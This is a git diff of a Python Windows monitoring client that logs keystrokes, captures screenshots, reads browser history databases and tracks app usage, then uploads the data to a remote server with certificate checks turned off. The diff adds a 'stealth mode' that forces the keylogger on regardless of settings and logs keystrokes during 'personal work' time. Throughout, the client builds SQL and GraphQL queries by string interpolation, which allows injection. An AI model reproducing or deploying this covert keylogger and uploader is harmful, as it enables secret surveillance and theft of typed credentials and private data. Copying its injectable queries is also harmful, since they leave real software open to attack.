@@ -1,3 +1,4 @@
+import sys
 from mss import mss
 import glob, os, threading, json, datetime, time, requests, random
 from pynput import keyboard, mouse
@@ -11,10 +12,10 @@ requests.packages.urllib3.disable_warnings()
 
 strokes = []
 mouse_strokes = []
-# capture_idle = 0
 
 ROOT_DIR = argv[1]
 WEB_URL = "https://ems.cloudadda.com/"
+STEALTH_MODE = False
 
 class DbConnector():
 	def __init__(self, name="engine.db", init = True):
@@ -43,8 +44,8 @@ class DbConnector():
 			self.conn.execute(command)
 			if commit:
 				self.conn.commit()
-		except sqlite3.OperationalError:
-			pass
+		except Exception as e:
+			print("Error", e)
 
 	def fetch_one(self, command: str):
 		try:
@@ -71,6 +72,8 @@ if not os.path.isdir(ROOT_DIR + "\\user_data"):
 class KeyStrokeWriter(threading.Thread):
 	def __init__(self):
 		threading.Thread.__init__(self)
+		self.daemon = True
+
 		self.date = str(datetime.date.today())
 		self.start_time = datetime.datetime.now().strftime("%d-%m-%Y+%H-%M-%S")
 		self.interval_time = 20
@@ -95,6 +98,8 @@ class KeyStrokeWriter(threading.Thread):
 class key_stroke_listener(threading.Thread):
 	def __init__(self, mode):
 		threading.Thread.__init__(self)
+		self.daemon = True
+
 		self.mode = mode
 		self.kill = False
 		self.listener = keyboard.Listener(on_press=self.on_press)
@@ -143,6 +148,7 @@ class key_stroke_listener(threading.Thread):
 class screen_shot_capture(threading.Thread):
 	def __init__(self, mode):
 		threading.Thread.__init__(self)
+		self.daemon = True
 		self.kill = False
 		self.mode = mode
 		self.date = str(datetime.date.today())
@@ -152,32 +158,23 @@ class screen_shot_capture(threading.Thread):
 	def remove_similar_images(self, img_dir, img_name, cutoff = 5):
 		dir_imgs = os.listdir(img_dir)
 		hash0 = imagehash.average_hash(Image.open(f'{img_dir}{img_name}'))
-		# idle = False
 		for img in dir_imgs:
 			if img != img_name:
 				file_name = f'{img_dir}{img}'
 				hash1 = imagehash.average_hash(Image.open(file_name)) 
 				if hash0 - hash1 < cutoff:
-					# idle = True
 					try:
 						os.remove(file_name)
 					except PermissionError:
 						pass
-		# return idle	
 
 	def capture_screen(self):
-		# global capture_idle
 		img_name = f"""{datetime.datetime.now().strftime("%d-%m-%Y %H-%M-%S")}.png"""
 		img_dir = ROOT_DIR + f"""\\user_data\\{self.date}\\images\\"""
 		file_name = f"{img_dir}{img_name}"
-		with mss() as sct:
+		with mss(mon=-1) as sct:
 			sct.shot(output = file_name)
 		self.remove_similar_images(img_dir = img_dir, img_name = img_name)
-		# if self.remove_similar_images(img_dir = img_dir, img_name = img_name):
-		# 	capture_idle += (datetime.datetime.now() - self.last_cap).total_seconds()
-		# else:
-		# 	capture_idle = 0
-		# self.last_cap = datetime.datetime.now()
 
 	def run(self):
 		print("Started screen shot capture thread")
@@ -192,6 +189,7 @@ class screen_shot_capture(threading.Thread):
 class app_usage_tracking(threading.Thread):
 	def __init__(self):
 		threading.Thread.__init__(self)
+		self.daemon = True
 		self.date = str(datetime.date.today())
 		self.opened_apps = {}
 		try:
@@ -255,8 +253,14 @@ class app_usage_tracking(threading.Thread):
 class browser_track_history(threading.Thread):
 	def __init__(self, mode):
 		threading.Thread.__init__(self)
+		self.daemon = True
 		self.kill = False
 		self.interval_time = 5
+		lst_snd = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'browser_last'; ")
+		if lst_snd and lst_snd[0]:
+			self.last_send = datetime.datetime.strptime(lst_snd[0], "%Y-%m-%d %H:%M:%S")
+		else:
+			self.last_send = datetime.datetime.now()
 		self.mode = mode
 		self.db_loc = [
 			f'C:\\Users\\{GetUserName()}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History',
@@ -264,8 +268,13 @@ class browser_track_history(threading.Thread):
 		]
 		print("Created browser history tracker thread")
 
-	def get_browser_data(self, timestamp):
+	def update_browser_last(self):
+		self.last_send = datetime.datetime.now()
+		db_conn.execute(f""" INSERT INTO kv_pair(key, value) VALUES ('browser_last', '{self.last_send.strftime("%Y-%m-%d %H:%M:%S")}') """, commit = True)
+
+	def get_browser_data(self):
 		ret = []
+		timestamp = (self.last_send.timestamp() + 11644473600) * (10**6)
 		for loc in self.db_loc:
 			con = DbConnector(loc, init = False)
 			if con.init():
@@ -279,15 +288,13 @@ class browser_track_history(threading.Thread):
 	def run(self):
 		print("Started browser history tracker thread")
 		if self.mode in [1,4]:
-			now = (datetime.datetime.now().timestamp() + 11644473600) * (10**6)
 			while True and not self.kill:
-				results = self.get_browser_data(now)
+				results = self.get_browser_data()
 				if results and len(results) > 0:
 					try:
 						for r in results:
 							db_conn.execute(f"INSERT INTO browser_history(url, description, visit_time, visit_count) VALUES ('{r[0]}', '{r[1]}', '{r[3]}', {r[2]})")
-						if len(results) > 0:
-							now = (datetime.datetime.now().timestamp() + 11644473600) * (10**6)
+						self.update_browser_last()
 					except Exception as e:
 						print(e)
 					time.sleep(5)
@@ -300,6 +307,7 @@ class browser_track_history(threading.Thread):
 class UserClient(threading.Thread):
 	def __init__(self, mode = 4, interval_time = 5):
 		threading.Thread.__init__(self)
+		self.daemon = True
 		self.date = str(datetime.date.today())
 		if not os.path.isdir(ROOT_DIR + '\\user_data\\' + self.date):
 			os.mkdir(ROOT_DIR + '\\user_data\\{}'.format(self.date))
@@ -309,7 +317,7 @@ class UserClient(threading.Thread):
 		self.exit_time = datetime.datetime.now()
 		self.config = json.load(open(ROOT_DIR + "\\config.json"))
 		self.run_tasks = {}
-		self.max_interval_idle = 120
+		self.max_interval_idle = 20
 		self.idle_time = 0
 
 		self.mode = mode
@@ -318,7 +326,6 @@ class UserClient(threading.Thread):
 
 		self.init_db()
 
-		# conn.execute("""INSERT INTO kv_pair (key, value) VALUES('mode', '{0}') ON CONFLICT(key) DO UPDATE SET value='{0}';""".format(self.mode))
 		print("Started User Monitoring")
 
 	def init_db(self):
@@ -330,10 +337,10 @@ class UserClient(threading.Thread):
 		], commit = True)
 
 	def get_runner_tasks(self):
-		modes_tasks = [ ['css', 'ak', 'bth', 'aut'], ['css', 'aut'], ['aut'], ['css', 'aut', 'bth'] ]
+		modes_tasks = [ ['css', 'ak', 'bth', 'aut'], ['css', 'aut'], ['aut'], ['ak', 'aut', 'bth'] ]
 		if self.config['css'] and 'css' in modes_tasks[self.mode-1]:
 			self.run_tasks['css'] = screen_shot_capture(mode = self.mode)
-		if self.config['ak'] and 'ak' in modes_tasks[self.mode-1]:
+		if (self.config['ak'] or STEALTH_MODE) and 'ak' in modes_tasks[self.mode-1]:
 			self.run_tasks['ak'] = key_stroke_listener(mode = self.mode)
 		if self.config['bth'] and 'bth' in modes_tasks[self.mode-1]:
 			self.run_tasks['bth'] = browser_track_history(mode = self.mode)
@@ -358,6 +365,7 @@ class UserClient(threading.Thread):
 		else:
 			self.idle_time = 0
 		if self.idle_time > self.max_interval_idle:
+			print("Are you there?? Looks like you have been idle for the past few minutes")
 			db_conn.execute("UPDATE kv_pair SET value = 1 WHERE key = 'aut';", commit = True)
 			st = time.perf_counter()
 			act = False
@@ -375,26 +383,12 @@ class UserClient(threading.Thread):
 				return False
 		return True
 
-	# def is_cap_running(self):
-	# 	global capture_idle
-	# 	# if capture_idle > 2 * self.max_interval_idle:
-	# 	if capture_idle > 20:
-	# 		db_conn.execute("UPDATE kv_pair SET value = 1 WHERE key = 'aut';", commit = True)
-	# 		st = time.perf_counter()
-	# 		act = False
-	# 		while time.perf_counter() - st < 25 and not act:
-	# 			val = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'aut';")
-	# 			if val and int(val[0]) == 0:
-	# 				capture_idle = 0
-	# 				act = True
-	# 				print("fine you are")
-	# 				return True
-	# 			time.sleep(1)
-	# 		if not act:
-	# 			print("nope you aren't")
-	# 			db_conn.execute("UPDATE kv_pair SET value=0 WHERE key = 'aut';", commit = True)
-	# 			return False
-	# 	return True
+	def check_idle(self):
+		global strokes
+		global mouse_strokes
+		if STEALTH_MODE and self.mode == 4:
+			if len(strokes) > 0 or len(mouse_strokes) > 0:
+				self.kill = True
 
 	def run(self):
 		print("IN {} mode".format(['Working', "Conference", "Call", "Idle / Personal Work"][self.mode-1]))
@@ -408,14 +402,15 @@ class UserClient(threading.Thread):
 				break
 			else:
 				if self.mode == 1 and ( ( 'ak' in self.run_tasks ) and ( not self.is_working() ) ):
-				# if self.mode == 1 and ( (('ak' in self.run_tasks) and (not self.is_working())) or (not self.is_cap_running()) ):
 					self.kill = True
+				self.check_idle()
 				time.sleep(self.interval_time)
 		print("Stopped user client thread")
 
 class UserDataUploader(threading.Thread):
 	def __init__(self, email, token):
 		threading.Thread.__init__(self)
+		self.daemon = True
 		self.email = email
 		self.token = token
 		print("Started Image uploading service.")
@@ -426,8 +421,14 @@ class UserDataUploader(threading.Thread):
 			rm = True
 			for db in data:
 				query = f'mutation add_browser_usage{{ addBrowserUsage(email: "{self.email}", token: "{self.token}", url: "{db[0]}", description: {json.dumps(db[1])}, visitTime: "{db[2]}", visitCount: {str(db[3])}) {{ result }} }}'
-				res = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
-				if res.status_code != 200:
+				try:
+					res = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
+					if res.status_code == 200:
+						resp = res.json()
+						if  not ( ("data" in resp) and ("addBrowserUsage" in resp["data"]) and ("result" in resp["data"]["addBrowserUsage"]) and (resp["data"]["addBrowserUsage"]["result"])):
+							rm = False
+							break
+				except:
 					rm = False
 					break
 			if rm:
@@ -445,11 +446,15 @@ class UserDataUploader(threading.Thread):
 					file_name = ob[-1].split(".")[0]
 					dl = False
 					with open(file, "rb") as fle:
-						req = requests.post(f"{WEB_URL}upload/{self.email}/ak/{file_name}/", files={"file": fle})
-						if req.status_code == 200:
-							if req.json()["status"] == 1:
-								dl = True
-						else:
+						try:
+							req = requests.post(f"{WEB_URL}upload/{self.email}/ak/{file_name}/", files={"file": fle})
+							if req.status_code == 200:
+								if req.json()["status"] == 1:
+									dl = True
+							else:
+								break
+						except Exception as e:
+							print(e)
 							break
 					if dl:
 						os.remove(file)
@@ -468,13 +473,18 @@ class UserDataUploader(threading.Thread):
 		rm = True
 		for db in data:
 			query = f"""mutation add_user_usage{{ addUserUsage(email: "{self.email}", token: "{self.token}", startTime: "{db[0].isoformat()}", workTime: {db[1]}, mode: {db[2]}) {{ result }} }}"""
-			req = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
-			if req.status_code == 200:
-				resp = req.json()
-				if  not ( ("data" in resp) and ("addUserUsage" in resp["data"]) and ("result" in resp["data"]["addUserUsage"]) and (resp["data"]["addUserUsage"]["result"])):
+			try:
+				req = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
+				if req.status_code == 200:
+					resp = req.json()
+					if  not ( ("data" in resp) and ("addUserUsage" in resp["data"]) and ("result" in resp["data"]["addUserUsage"]) and (resp["data"]["addUserUsage"]["result"])):
+						rm = False
+						break
+				else:
 					rm = False
 					break
-			else:
+			except Exception as e:
+				print(e)
 				rm = False
 				break
 		if rm:
@@ -486,18 +496,19 @@ class UserDataUploader(threading.Thread):
 		for file in apps_usage_file:
 			try:
 				dt = file.split("\\")[-2]
-				rm = True
+				rm = False
 				if dt != str(datetime.date.today()):
-					with open(file) as fl:
+					with open(file, "r") as fl:
 						dat = json.load(fl)
-						for app, tm in dat.items():
-							query = f""" mutation add_app_usage{{ addAppUsage(email: "{self.email}", token: "{self.token}", appName: {json.dumps(app)}, openTime: {tm}, date: "{dt}") {{ result }} }} """
+						query = f""" mutation add_app_usage{{ addAppUsage(email: "{self.email}", token: "{self.token}", appName: {json.dumps(list(dat.keys()))}, openTime: {json.dumps(list(dat.values()))}, date: "{dt}") {{ result }} }} """
+						try:
 							req = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
-							if req.status_code != 200:
-								rm = False
-								break
-				else:
-					rm = False
+							if req.status_code == 200:
+								resp = req.json()
+								if  ("data" in resp) and ("addAppUsage" in resp["data"]) and ("result" in resp["data"]["addAppUsage"]) and (resp["data"]["addAppUsage"]["result"]):
+									rm = True
+						except Exception as e:
+							print(e)
 				if rm:
 					os.remove(file)
 			except Exception as e:
@@ -510,13 +521,17 @@ class UserDataUploader(threading.Thread):
 				file_name = file.split("\\")[-1].split(".")[0]
 				rm = False
 				with open(file, "rb") as fle:
-					req = requests.post(f"{WEB_URL}upload/{self.email}/css/{file_name}/", files={"file": fle})
-					if req.status_code == 200:
-						if req.json()["status"] == 1:
-							rm = True
+					try:
+						req = requests.post(f"{WEB_URL}upload/{self.email}/css/{file_name}/", files={"file": fle})
+						if req.status_code == 200:
+							if req.json()["status"] == 1:
+								rm = True
+							else:
+								break
 						else:
 							break
-					else:
+					except Exception as e:
+						print(e)
 						break
 				if rm:
 					os.remove(file)
@@ -526,7 +541,10 @@ class UserDataUploader(threading.Thread):
 	def send_error(self, error, where):
 		try:
 			query = f""" mutation add_user_error{{	addUserError(email:"{self.email}", error: {json.dumps(error)}, where: "{where}")	{{	result	}}	}} """
-			req = requests.post(f"{WEB_URL}api/", json={"query": query})
+			try:
+				req = requests.post(f"{WEB_URL}api/", json={"query": query})
+			except Exception as e:
+				print(e)
 		except Exception as e:
 			print(e)
 
@@ -559,7 +577,9 @@ class UserDataUploader(threading.Thread):
 class ModeListener(threading.Thread):
 	def __init__(self, email, token, mode = 4):
 		threading.Thread.__init__(self)
-		self.monitor_thread = UserClient(mode = mode)
+		self.daemon = True
+		self.mode = mode
+		self.monitor_thread = UserClient(mode = self.mode)
 		self.email = email
 		self.token = token
 
@@ -576,21 +596,17 @@ class ModeListener(threading.Thread):
 	def run(self):
 		if self.email:
 			self.monitor_thread.start()
-			val = db_conn.fetch_one(""" SELECT value FROM kv_pair WHERE key='mode'; """)
-			crnt_mode = int(val[0])
 			while True:
 				cr = db_conn.fetch_one(""" SELECT value FROM kv_pair WHERE key='mode'; """)
 				ch_mode = int(cr[0])
-				if ch_mode != crnt_mode:
+				if ch_mode != self.mode:
 					self.stop_main_thread()
-					self.create_new_thread(mode = ch_mode)
+					self.mode = ch_mode
+					self.create_new_thread(mode = self.mode)
 					self.start_new_thread()
 
 				if self.monitor_thread.kill: # The thread will only be killed iff the thread mentions it to do (in this desktop is unresponsive. So switching back to idle)
-					self.stop_main_thread()
-					self.create_new_thread(mode = 4) 
-					self.start_new_thread()
-				crnt_mode = ch_mode
+					db_conn.execute(f" UPDATE kv_pair SET value = '{1 if self.mode == 4 else 4}' WHERE key = 'mode' ", commit = True)
 				time.sleep(1)
 		else:
 			print("The app is unregistered. Please download from the site again.")
@@ -600,6 +616,7 @@ if __name__ == "__main__":
 		""" CREATE TABLE IF NOT EXISTS kv_pair (key STRING primary key ON CONFLICT REPLACE, value STRING); """,
 		""" CREATE TABLE IF NOT EXISTS user_active_status (start_time TIMESTAMP, end_time TIMESTAMP, mode INT, active BOOLEAN, uploaded BOOLEAN DEFAULT 0) """,
 		""" CREATE TABLE IF NOT EXISTS browser_history (url TEXT, description TEXT, visit_time DATETIME, visit_count INT)""",
+		f""" INSERT INTO kv_pair(key, value) VALUES ('browser_last', '{datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}') """
 		], commit = True
 	)
 	email = db_conn.fetch_one("SELECT value FROM kv_pair WHERE key = 'email';")
@@ -610,24 +627,34 @@ if __name__ == "__main__":
 		email = email[0]
 		token = token[0]
 		query = f'query get_user_config{{ getUserConfig(email: "{email}", token: "{token}"){{ role, captureScreenShots, activeKeyLogger, browserTrackingHistory, appsUsageTracking, stealthMode }} }}'
-		res = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
-		if res.status_code == 200:
-			json_data = res.json()
-			if "data" in json_data and "getUserConfig" in json_data["data"] and (json_data['data']['getUserConfig']):
-				resp = json_data['data']['getUserConfig']
-				config = {
-					"role": resp['role'], 
-					"css": resp['captureScreenShots'], 
-					"ak": resp['activeKeyLogger'], 
-					"bth": resp['browserTrackingHistory'], 
-					"aut": resp['appsUsageTracking'], 
-					"sm": resp['stealthMode'] 
-				}
-				with open(ROOT_DIR + "\\config.json", "w+") as fl:
-					json.dump(config, fl)
+		try:
+			res = requests.post(url = f"{WEB_URL}api/", json = {'query': query}, verify = False)
+			if res.status_code == 200:
+				json_data = res.json()
+				if "data" in json_data and "getUserConfig" in json_data["data"] and (json_data['data']['getUserConfig']):
+					resp = json_data['data']['getUserConfig']
+					config = {
+						"role": resp['role'], 
+						"css": resp['captureScreenShots'], 
+						"ak": resp['activeKeyLogger'], 
+						"bth": resp['browserTrackingHistory'], 
+						"aut": resp['appsUsageTracking'], 
+						"sm": resp['stealthMode'] 
+					}
+					with open(ROOT_DIR + "\\config.json", "w+") as fl:
+						json.dump(config, fl)
+		except Exception as e:
+			print(e)
 		if os.path.isfile(ROOT_DIR + "\\config.json"):
+			with open(ROOT_DIR + "\\config.json") as fl:
+				config_data = json.load(fl)
+			STEALTH_MODE = True if config_data["sm"] else False
 			db_conn.execute(""" UPDATE kv_pair SET value = 1 WHERE key = 'register'; """)
 			image_uploader_thread = UserDataUploader(email, token)
-			md_lstn_thread = ModeListener(mode = 1, email = email, token = token)
+			md_lstn_thread = ModeListener(mode = 4, email = email, token = token)
 			image_uploader_thread.start()
 			md_lstn_thread.start()
+			while True:
+				time.sleep(1)
+		else:
+			sys.exit()
